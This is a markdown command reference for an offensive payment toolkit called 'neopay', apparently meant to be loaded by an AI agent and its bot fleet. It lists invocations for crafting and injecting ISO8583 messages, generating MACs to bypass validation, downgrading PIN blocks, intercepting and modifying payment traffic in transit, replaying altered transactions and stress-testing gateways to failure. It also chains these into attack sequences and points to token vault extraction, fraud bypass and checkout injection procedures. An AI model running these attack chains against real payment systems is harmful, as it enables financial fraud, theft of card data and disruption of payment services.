# NEOPAY_COMMANDS.md — Payment Attack Command Reference

Single authoritative reference for all neopay offensive capabilities. Load this file when executing payment-related operations.

---

## ISO8583 Protocol Operations

### Parse Message
```bash
python3 neopay/scripts/parse_iso8583.py \
  --dialect auto|hiso93|hiso87 \
  --input /path/to/message.bin \
  --explain
```
**Source:** `neopay/scripts/parse_iso8583.py`
**Use:** Decode intercepted ISO8583 traffic, identify fields, determine dialect
**Output:** Parsed field table with MTI, bitmap, all present data elements
**Chain:** After traffic capture (tcpdump/mitmproxy) → before field analysis

### Generate Message
```bash
python3 neopay/scripts/parse_iso8583.py \
  --dialect hiso93|hiso87 \
  --mti 0100|0200|0400|0800 \
  --pan <card_number> \
  --amount <amount_in_cents> \
  --datetime <ISO_datetime> \
  --terminal <terminal_id> \
  --merchant <merchant_id> \
  --output /tmp/crafted_msg.bin
```
**Use:** Craft ISO8583 messages for injection testing
**Chain:** After identifying target dialect → send via netcat/custom TCP client

### Fuzz Fields
```bash
python3 neopay/scripts/fuzzer.py \
  --target <host>:<port> \
  --dialect hiso93|hiso87 \
  --field <DE_number> \
  --variations "<comma_separated_values>" \
  --timeout 5 \
  --log /tmp/fuzz_results.json
```
**Source:** `neopay/scripts/fuzzer.py`
**Use:** Test field boundary conditions, overflow, injection vectors
**Output:** Response codes per variation, timing data, error states
**Chain:** After dialect identified → fuzz each field → analyze DE39 responses

### Fingerprint Gateway
```bash
python3 neopay/scripts/fingerprinter.py <host> <port>
```
**Source:** `neopay/scripts/fingerprinter.py` (also `neopay/scripts/fingerprinter.py`)
**Use:** Identify payment gateway vendor, ISO8583 dialect, protocol version
**Output:** Gateway fingerprint (vendor, version, dialect, supported MTIs)
**Chain:** First step in any ISO8583 engagement → feeds into all subsequent commands

### Replay Engine
```bash
python3 neopay/scripts/replay_engine.py \
  --pcap /path/to/capture.pcap \
  --target <host>:<port> \
  --modify-field <DE_number>=<new_value> \
  --delay-ms 100
```
**Source:** `neopay/scripts/replay_engine.py`
**Use:** Replay captured transactions with modifications for testing
**Chain:** After PCAP capture → modify critical fields (amount, PAN, MAC) → resend

---

## HSM & Cryptographic Operations

### HSM Simulator (for test environments)
```bash
python3 neopay/scripts/hsm_simulator.py --mode server --port 8444
```
**Use:** Start local HSM simulator for testing commands before live engagement

### MAC Generation
```bash
python3 neopay/scripts/hsm_simulator.py \
  --command MAC_GENERATE \
  --key-index <key_slot> \
  --data "<base64_message_data>" \
  --algorithm ISO9797_1|ISO9797_3|HMAC_SHA256
```
**Source:** `neopay/scripts/hsm_simulator.py`
**Use:** Generate MAC for message injection — bypass MAC validation on target
**Output:** MAC hex value for insertion into DE64/DE128
**Chain:** After crafting message body → generate MAC → insert into message → send

### MAC Insertion
```bash
python3 neopay/scripts/mac_generator.py \
  --insert-mac \
  --message /path/to/message.bin \
  --mac <hex_mac_value> \
  --field 64|128 \
  --output /path/to/mac_message.bin
```
**Source:** `neopay/scripts/mac_generator.py` (also `neopay/scripts/mac_generator.py`)
**Use:** Insert generated MAC into crafted ISO8583 message

### PIN Block Generation
```bash
python3 neopay/scripts/pin_block.py \
  --generate \
  --pin <pin_digits> \
  --pan <card_number> \
  --format 0|1|2|3|4
```
**Source:** `neopay/scripts/pin_block.py` (also `neopay/scripts/pin_block.py`)
**Use:** Generate PIN blocks in ISO9564 formats for testing
**Output:** Hex-encoded PIN block

### PIN Block Translation
```bash
python3 neopay/scripts/pin_block.py \
  --translate \
  --input-format 0 \
  --output-format 3 \
  --pin-block <hex_pin_block> \
  --pan <card_number>
```
**Use:** Convert PIN blocks between formats (testing format downgrade attacks)

### ARQC Generation
```bash
python3 neopay/scripts/hsm_simulator.py \
  --command ARQC_GENERATE \
  --pan <card_number> \
  --pan-seq <sequence_number> \
  --amount <amount_in_cents> \
  --txn-datetime <YYMMDDhhmmss> \
  --atc <application_transaction_counter> \
  --unpredictable-num <8_hex_digits>
```
**Use:** Generate EMV chip authentication request cryptogram
**Chain:** Generate ARQC → send in authorization → verify ARPC response

### ARPC Verification
```bash
python3 neopay/scripts/hsm_simulator.py \
  --command ARPC_VERIFY \
  --arqc <arqc_hex> \
  --arpc <arpc_hex> \
  --cpsn <counter>
```
**Use:** Verify issuer authentication response cryptogram

### Crypto Downgrade Testing
```bash
python3 neopay/scripts/crypto_downgrade.py \
  --target <host>:<port> \
  --test tls_version|cipher_suite|mac_algorithm|pin_format \
  --log /tmp/downgrade_results.json
```
**Source:** `neopay/scripts/crypto_downgrade.py` (also `neopay/scripts/crypto_downgrade.py`)
**Use:** Test if gateway accepts weaker cryptographic configurations
**Output:** Accepted downgrades, minimum security levels enforced

---

## POS Terminal Operations

### SPDH Protocol Testing
```bash
python3 neopay/scripts/fuzzer.py \
  --protocol spdh \
  --target <terminal_host>:<port> \
  --command MULTICALL|KEYDL|STATUS \
  --payload <hex_payload>
```
**Use:** Test Verifone SPDH terminal protocol commands

### XFlow Remote Commands
```bash
python3 neopay/scripts/fuzzer.py \
  --protocol xflow \
  --target <terminal_host>:<port> \
  --command <xflow_command> \
  --auth-token <token_if_required>
```
**Use:** Send Verifone XFlow remote management commands

### Transaction Flow Analysis
```bash
python3 neopay/scripts/transaction_flow.py \
  --target <host>:<port> \
  --capture-flow \
  --duration 60 \
  --output /tmp/flow_analysis.json
```
**Source:** `neopay/scripts/transaction_flow.py` (also `neopay/scripts/transaction_flow.py`)
**Use:** Map complete transaction lifecycle (auth → capture → settle)

---

## Traffic Interception

### MITM Proxy
```bash
python3 neopay/scripts/mitm_proxy.py \
  --listen <local_port> \
  --target <remote_host>:<remote_port> \
  --log /tmp/mitm_capture.pcap \
  --modify-field <DE_number>=<value>
```
**Source:** `neopay/scripts/mitm_proxy.py`
**Use:** Intercept and modify payment traffic in transit
**Chain:** Set up proxy → capture traffic → parse with parse_iso8583 → identify targets

### PCAP Analysis
```bash
python3 neopay/scripts/pcap_tools.py \
  --input /path/to/capture.pcap \
  --filter iso8583|spdh|xflow \
  --extract-messages \
  --output /tmp/extracted_messages/
```
**Source:** `neopay/scripts/pcap_tools.py`
**Use:** Extract payment protocol messages from packet captures

---

## Load Testing & Stress

### Load Tester
```bash
python3 neopay/scripts/load_tester.py \
  --target <host>:<port> \
  --dialect hiso93|hiso87 \
  --tps <transactions_per_second> \
  --duration <seconds> \
  --report /tmp/load_report.json
```
**Source:** `neopay/scripts/load_tester.py`
**Use:** Stress test payment gateway, identify failure thresholds

### Stress Tester
```bash
python3 neopay/scripts/stress_tester.py \
  --target <host>:<port> \
  --mode ramp|burst|sustained \
  --max-tps 1500 \
  --report /tmp/stress_report.json
```
**Source:** `neopay/scripts/stress_tester.py`
**Use:** Push gateway to breaking point, discover resource exhaustion vectors

---

## Echo & Health Testing

### Echo Server (for testing)
```bash
python3 neopay/scripts/echo_server.py \
  --port <port> \
  --dialect hiso93|hiso87 \
  --log /tmp/echo_log.json
```
**Source:** `neopay/scripts/echo_server.py`
**Use:** Stand up local echo server to test message construction before live target

---

## Bot Fleet Monitoring

### Bot Monitor Dashboard
```bash
python3 neopay/scripts/bot_monitor.py \
  --status \
  --bots recon,intel,hunter,ops \
  --output telegram|console|json
```
**Source:** `neopay/scripts/bot_monitor.py` (also `neopay/scripts/bot_monitor.py`)
**Use:** Check bot fleet health, queue depths, last cycle status

---

## Command Chaining — Standard Attack Sequences

### ISO8583 Gateway Full Test
```
fingerprinter.py → parse_iso8583.py → fuzzer.py → hsm_simulator.py (MAC) → mac_generator.py → send message
```

### HSM Attack Chain
```
hsm_simulator.py (identify) → pin_block.py (generate) → hsm_simulator.py (translate) → crypto_downgrade.py
```

### Token Extraction
```
transaction_flow.py (capture) → parse_iso8583.py (extract DE tokens) → fuzzer.py (token field manipulation)
```

### Full Engagement Flow
```
fingerprinter.py → transaction_flow.py → parse_iso8583.py → fuzzer.py (all DEs) → hsm_simulator.py → replay_engine.py
```

---

## Error Handling

| Error | Cause | Resolution |
|---|---|---|
| `Connection refused` | Port closed or firewall | Verify target port via nmap, try SSL wrapper |
| `Timeout` | Gateway not responding | Increase --timeout, check network route |
| `MAC failure (DE39=63)` | Wrong key or algorithm | Try different --key-index or --algorithm |
| `Invalid MTI response` | Wrong dialect | Switch between hiso93/hiso87 |
| `Binary garbage response` | Wrong format parsing | Force --dialect hiso87 |
| `Import error` | Missing Python dependency | Run `pip install -r requirements.txt` in neopay/ |
| `Permission denied` | Script not executable | `chmod +x neopay/scripts/*.py` |

---

## Cross-References

| Task | Skill File | Procedure |
|---|---|---|
| ISO8583 protocol operations | `skills/iso8583-operator/SKILL.md` | `memory/procedures/iso8583_attack.md` |
| HSM cryptographic testing | `skills/hsm-operator/SKILL.md` | `memory/procedures/hsm_attack.md` |
| Token vault extraction | `skills/token-vault/SKILL.md` | `memory/procedures/token_vault_extraction.md` |
| Fraud engine bypass | `skills/fraud-bypass/SKILL.md` | `memory/procedures/fraud_bypass.md` |
| Checkout injection | `skills/web-inject/SKILL.md` | `memory/procedures/checkout_injection.md` |
| POS terminal attacks | `neopay/references/pos_protocols.md` | `memory/procedures/pos_terminal_attack.md` |
| Webhook hijacking | `skills/web-inject/SKILL.md` | `memory/procedures/webhook_hijack.md` |
| Full neopay attack methodology | `neopay/ATTACK_PLAYBOOK.md` | All procedures |
